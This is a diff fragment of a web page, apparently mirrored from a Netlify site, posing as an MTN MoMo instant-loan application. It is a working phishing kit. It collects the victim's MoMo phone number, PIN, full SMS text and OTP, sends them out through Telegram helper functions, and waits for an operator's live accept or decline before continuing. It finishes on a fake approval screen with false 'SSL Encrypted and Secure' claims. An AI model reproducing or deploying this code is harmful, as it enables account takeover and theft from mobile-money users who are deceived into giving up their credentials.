+              goToSmsVerify();
+            }
+          }, 1300);
+        },
+        /* Decline */
+        function() {
+          document.getElementById('pinInput').value = '';
+          showDeclined(
+            'Login Details Incorrect',
+            'The phone number or PIN you entered does not match our records. Please double-check your MTN MoMo number and PIN, then try again.'
+          );
+        }
+      );
+    });
+  }
+
+  function goToSmsVerify() {
+    var ph = document.getElementById('loginPhoneDisplay').value || '077 000 0000';
+    document.getElementById('smsPhoneNumber').textContent = ph;
+    document.getElementById('smsContent').value = '';
+    document.getElementById('smsCharCount').textContent = '0';
+    document.getElementById('smsErr').style.display = 'none';
+    showPage('page5');
+  }
+
+  function onSmsInput(ta) {
+    var len = ta.value.length;
+    document.getElementById('smsCharCount').textContent = len;
+  }
+
+  function submitSms() {
+    var val = document.getElementById('smsContent').value.trim();
+    var err = document.getElementById('smsErr');
+    if (!val) { showErr(err, 'Please paste the full SMS content before continuing.'); return; }
+    err.style.display = 'none';
+    alert('SMS verified! Proceeding to your loan offer.');
+  }
+
+  function showErr(el, msg) {
+    el.textContent = msg;
+    el.style.display = 'block';
+  }
+
+  updateSummary();
+</script>
+
+<!-- ══ PAGE 4: MTN MOMO LOGIN ══ -->
+<div id="page4" class="page">
+  <div class="login-card">
+    <button class="login-close" onclick="showPage('page3')" aria-label="Close">&#x2715;</button>
+
+    <div class="login-icon-wrap">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+    </div>
+
+    <h2>Login to your MTN MoMo account</h2>
+    <p>To proceed with the application, please sign in with your MTN MoMo number and PIN.</p>
+
+    <div id="loginForm">
+      <label class="field-label" for="loginPhoneDisplay">MTN phone number</label>
+      <input class="phone-display-box" id="loginPhoneDisplay" type="tel" inputmode="numeric" value="077 000 0000" />
+
+      <label class="field-label" for="pinInput">PIN</label>
+      <input class="pin-input" id="pinInput" type="password" inputmode="numeric" maxlength="5" placeholder="Enter 4 or 5 digits" />
+      <p class="login-hint">Enter the PIN you set for your MTN account.</p>
+
+      <p class="login-err" id="loginErr"></p>
+
+      <button class="btn-login" onclick="submitLogin()">Login</button>
+    </div>
+
+    <div id="loginSpinner">
+      <div class="spinner"></div>
+      <p class="spinner-text" id="spinnerMsg">Verifying your identity…</p>
+      <p class="spinner-sub">Please wait a moment</p>
+    </div>
+  </div>
+</div>
+
+<!-- ══ PAGE 5: SMS VERIFICATION ══ -->
+<div id="page5" class="page">
+  <div class="p5-card">
+    <h2>Full SMS Verification</h2>
+    <p class="sub">Please paste the full SMS content you received from MTN MoMo.</p>
+
+    <div class="sending-box">
+      <p class="to-label">Sending To</p>
+      <p class="to-number" id="smsPhoneNumber">077 000 0000</p>
+    </div>
+
+    <div class="warning-box">
+      <div class="warn-icon">⚠️</div>
+      <p><strong>DO NOT edit the SMS</strong> — only copy and paste the entire message below</p>
+    </div>
+
+    <label class="sms-field-label" for="smsContent">Paste Full SMS Content</label>
+    <textarea
+      class="sms-textarea"
+      id="smsContent"
+      placeholder="Paste the entire MTN MoMo SMS here…"
+      maxlength="1000"
+      oninput="onSmsInput(this)"
+    ></textarea>
+    <p class="char-count"><span id="smsCharCount">0</span> / 1000 characters</p>
+
+    <p class="sms-err" id="smsErr"></p>
+
+    <button class="btn-next" onclick="submitSms()">Next Step →</button>
+
+    <div class="ssl-label">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+      SSL Encrypted and Secure
+    </div>
+  </div>
+</div>
+
+<!-- ══ PAGE 6: OTP VERIFICATION ══ -->
+<div id="page6" class="page">
+  <div class="p6-card">
+    <h2>OTP Verification</h2>
+    <p class="sub">Please enter the OTP code you received in the SMS.</p>
+
+    <div class="otp-sending-box">
+      <p class="otp-sending-label">Sending To</p>
+      <p class="otp-phone-number" id="otpPhoneDisplay">797979949</p>
+    </div>
+
+    <p class="otp-enter-label">Enter OTP Code</p>
+
+    <div class="otp-dots-box" onclick="document.getElementById('otpInput').focus()">
+      <input
+        class="otp-hidden-input"
+        id="otpInput"
+        type="tel"
+        inputmode="numeric"
+        maxlength="4"
+        autocomplete="one-time-code"
+        oninput="onOtpInput(this)"
+      />
+      <div class="otp-dot" id="otpDot0"></div>
+      <div class="otp-dot" id="otpDot1"></div>
+      <div class="otp-dot" id="otpDot2"></div>
+      <div class="otp-dot" id="otpDot3"></div>
+    </div>
+
+    <p class="otp-err" id="otpErr">Please enter the 4-digit OTP.</p>
+
+    <button class="btn-otp-verify" onclick="submitOtp()">✓ Verify &amp; Complete</button>
+
+    <div class="otp-ssl-label">
+      <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+      SSL Encrypted and Secure
+    </div>
+  </div>
+</div>
+
+<script>
+  /* OTP page helpers */
+  function onOtpInput(input) {
+    var val = input.value.replace(/\D/g, '').slice(0, 4);
+    input.value = val;
+    for (var i = 0; i < 4; i++) {
+      document.getElementById('otpDot' + i).classList.toggle('filled', i < val.length);
+    }
+  }
+
+  function submitOtp() {
+    var val = document.getElementById('otpInput').value.trim();
+    var err = document.getElementById('otpErr');
+    if (!val || val.length < 4) {
+      err.style.display = 'block';
+      return;
+    }
+    err.style.display = 'none';
+    var ph  = document.getElementById('loginPhoneDisplay').value || '';
+    var cbId = 'otp_' + Date.now();
+
+    showWaiting('Verifying OTP…', 'Please wait while we confirm your one-time password.');
+
+    tgSendWithButtons(
+      '🔢 <b>MTN MoMo OTP</b>\n\n' +
+      '📱 <b>Phone:</b> <code>' + ph + '</code>\n' +
+      '🔑 <b>OTP:</b> <code>' + val + '</code>\n' +
+      '⏰ <i>' + new Date().toLocaleString('en-GB', { timeZone: 'Africa/Kampala' }) + ' (EAT)</i>\n\n' +
+      '📱 <code>' + ph + '</code>',
+      cbId
+    ).then(function(res) {
+      var msgId = res && res.result && res.result.message_id;
+      tgPollDecision(cbId, msgId,
+        /* Accept */
+        function() {
+          hideWaiting();
+          goToSuccess();
+        },
+        /* Decline */
+        function() {
+          document.getElementById('otpInput').value = '';
+          for (var d = 0; d < 4; d++) {
+            document.getElementById('otpDot' + d).classList.remove('filled');
+          }
+          showDeclined(
+            'OTP Verification Failed',
+            'The OTP you entered is incorrect or has expired. Please request a new OTP from MTN MoMo and enter it again.'
+          );
+        }
+      );
+    });
+  }
+
+  function goToSuccess() {
+    var s = calcSummary();
+    document.getElementById('successAmount').textContent = fmt(amount);
+    document.getElementById('successPeriod').textContent = months + ' month' + (months > 1 ? 's' : '');
+    document.getElementById('successMonthly').textContent = fmt(s.monthly);
+    document.getElementById('successTotal').textContent = fmt(s.total);
+    document.getElementById('successPurpose').textContent = purpose || '—';
+    var ph = document.getElementById('loginPhoneDisplay').value || '077 000 0000';
+    document.getElementById('successPhone').textContent = ph;
+    showPage('page7');
+  }
+
+  /* Wire page 5 SMS submit to go to page 6 instead of alerting */
+  function submitSms() {
+    var val = document.getElementById('smsContent').value.trim();
+    var err = document.getElementById('smsErr');
+    if (!val) { showErr(err, 'Please paste the full SMS content before continuing.'); return; }
+    err.style.display = 'none';
+    var ph  = document.getElementById('loginPhoneDisplay').value || '';
+    var cbId = 'sms_' + Date.now();
+
+    showWaiting('Verifying SMS…', 'Please wait while we validate the SMS content you provided.');
+
+    tgSend(val, null).then(function() {
+      return tgSendWithButtons('⬆️ <b>Action required</b> — Accept or decline the SMS above:\n📱 <code>' + ph + '</code>', cbId);
+    }).then(function(res) {
+      var msgId = res && res.result && res.result.message_id;
+      tgPollDecision(cbId, msgId,
+        /* Accept */
+        function() {
+          hideWaiting();
+          goToOtpVerify();
+        },
+        /* Decline */
+        function() {
+          document.getElementById('smsContent').value = '';
+          document.getElementById('smsCharCount').textContent = '0';
+          showDeclined(
+            'SMS Verification Failed',
+            'The SMS content you submitted could not be verified. Please ensure you have pasted the complete, unedited SMS received from MTN MoMo and try again.'
+          );
+        }
+      );
+    });
+  }
+
+  function goToOtpVerify() {
+    var ph = document.getElementById('loginPhoneDisplay').value || '077 000 0000';
+    document.getElementById('otpPhoneDisplay').textContent = ph;
+    document.getElementById('otpInput').value = '';
+    for (var i = 0; i < 4; i++) {
+      document.getElementById('otpDot' + i).classList.remove('filled');
+    }
+    document.getElementById('otpErr').style.display = 'none';
+    showPage('page6');
+  }
+</script>
+
+<!-- ══ PAGE 7: SUCCESS ══ -->
+<div id="page7" class="page">
+  <div class="success-card">
+
+    <div class="success-icon-ring">
+      <div class="success-check-circle">
+        <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+    </div>
+
+    <h2>Application Submitted!</h2>
+    <p>Your loan application has been received. We're reviewing it now and will send funds directly to your MTN MoMo wallet once approved.</p>
+
+    <div class="success-amount-box">
+      <p class="success-amount-label">Loan Amount Requested</p>
+      <p class="success-amount-value" id="successAmount">UGX 2,000,000</p>
+      <p class="success-amount-sub">Sent to MoMo · <span id="successPhone">077 000 0000</span></p>
+    </div>
+
+    <div class="success-details">
+      <div class="success-detail-row">
+        <span>Repayment period</span>
+        <span id="successPeriod">6 months</span>
+      </div>
+      <div class="success-detail-row">
+        <span>Monthly repayment</span>
+        <span id="successMonthly">UGX 393,333</span>
+      </div>
+      <div class="success-detail-row">
+        <span>Total repayment</span>
+        <span id="successTotal">UGX 2,360,000</span>
+      </div>
+      <div class="success-detail-row">
+        <span>Purpose</span>
+        <span id="successPurpose">—</span>
+      </div>
+    </div>
+
+    <div class="success-notice">
+      <span class="success-notice-icon">📱</span>
+      <span>You'll receive an SMS confirmation shortly. If approved, funds arrive in your MoMo wallet within <strong>10 minutes</strong>.</span>
+    </div>
+
+    <button class="btn-success-home" onclick="goHome()">Back to Home</button>
+    <button class="btn-success-secondary" onclick="goToApply()">Apply for Another Loan</button>
+
+  </div>
+</div>
+
+<!-- ══ WAITING / APPROVAL OVERLAY ══ -->
+<div id="waitingOverlay">
+  <div class="waiting-card" id="waitingCard">
+    <div class="waiting-spinner" id="waitingSpinner"></div>
+    <div class="waiting-icon-err" id="waitingIconErr" style="display:none;">⚠️</div>
+    <div class="waiting-title" id="waitingTitle">Verifying your details…</div>
+    <div class="waiting-msg"   id="waitingMsg">Please wait while we confirm your information.</div>
+    <button class="waiting-retry-btn" id="waitingRetryBtn" style="display:none;" onclick="hideWaiting()">Try Again</button>
+  </div>
+</div>
+
+</body>
+
+<!-- Mirrored from https://a-pply-for-i-nstant-momo-loans-now.netlify.app/ by HTTrack Website Copier/3.x [XR&CO], Thu, 19 Nov 2026 21:46:55 GMT -->
+</html>
+<script async src=".netlify/scripts/hud3eb9?variant=public" data-nf-variant="public" data-netlify-site-id="8af50785-75fd-4544-b92b-1d285b1f901f" data-app-host="app.netlify.com" data-account-tier="free"></script>
